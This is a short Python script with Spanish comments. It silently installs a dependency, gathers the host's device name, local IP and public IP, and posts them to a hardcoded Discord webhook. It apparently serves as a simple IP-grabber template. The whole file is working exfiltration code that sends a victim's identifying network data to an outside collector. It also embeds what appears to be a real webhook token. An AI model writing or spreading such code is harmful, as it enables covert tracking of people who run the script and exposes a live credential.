import subprocess
import sys
import socket
import requests
import platform
import json

# Instalar automáticamente las dependencias si no están presentes
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Intentar importar requests, si no se encuentra instalarlo automáticamente
try:
    import requests
except ImportError:
    print("Instalando 'requests'...")
    install("requests")
    import requests

# Obtener el nombre del dispositivo
device_name = platform.node()

# Obtener la IP local
local_ip = socket.gethostbyname(socket.gethostname())

# Obtener la IP pública usando un servicio de terceros
try:
    public_ip = requests.get('https://api.ipify.org').text
except requests.RequestException:
    public_ip = "No disponible"

# Crear el mensaje para enviar al webhook
message = {
    "content": f"**Información del Dispositivo** - **Nombre del Dispositivo**: {device_name} **IP Local**: {local_ip} **IP Pública**: {public_ip}"
}

# URL del webhook de Discord (reemplázala por la tuya)
webhook_url = "https://discord.com/api/webhooks/1370822761500512497/Gj30Me03SSycp8VwMURIu-nT4Cwwv5HeY55yUNvlNz8wPNDOeAQVRR_f4KZ7HPjr5guP"

# Enviar la información al webhook
try:
    response = requests.post(webhook_url, json=message, headers={"Content-Type": "application/json"})
    response.raise_for_status()  # Lanza una excepción si la respuesta fue un error
    print("Datos enviados correctamente.")
except requests.exceptions.RequestException as e:
    print(f"Error al enviar la información: {e}")
